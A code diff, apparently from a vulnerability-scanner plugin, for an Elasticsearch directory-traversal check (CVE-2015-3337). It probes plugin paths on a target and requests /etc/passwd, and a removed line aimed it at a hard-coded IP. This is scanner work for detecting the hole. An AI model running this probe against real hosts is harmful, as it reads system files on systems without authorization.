@@ -17,7 +17,7 @@ def audit(arg):
     host = arg
     pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk' ,'head' ]
     try:
-        for plugin in pluginList:     
+        for plugin in pluginList:
             socket.setdefaulttimeout(3)
             s = socket.socket()
             s.connect((host,port))
@@ -25,15 +25,15 @@ def audit(arg):
                 "Host: %s\n\n" % (plugin, host))
             file = s.recv(16)
             if ("HTTP/1.0 200 OK" in file):
-                grab(plugin,host,port)
-                break
+                return grab(plugin,host,port)
+
     except Exception:
             pass
     finally:
         s.close()
-        
+
 def grab(plugin,host,port):
-    fpath = '/etc/passwd'  
+    fpath = '/etc/passwd'
     socket.setdefaulttimeout(3)
     s = socket.socket()
     s.connect((host,port))
@@ -42,6 +42,7 @@ def grab(plugin,host,port):
     file = s.recv(2048)
     if "HTTP/1.0 200 OK" in file and 'root' in file:
         security_hole('CVE-2015-3337')
-if __name__ == '__main__':
+
+        return host
+if __name__== '__main__':
     from dummy import *
-    audit(assign('ip', '14.18.16.33')[1])
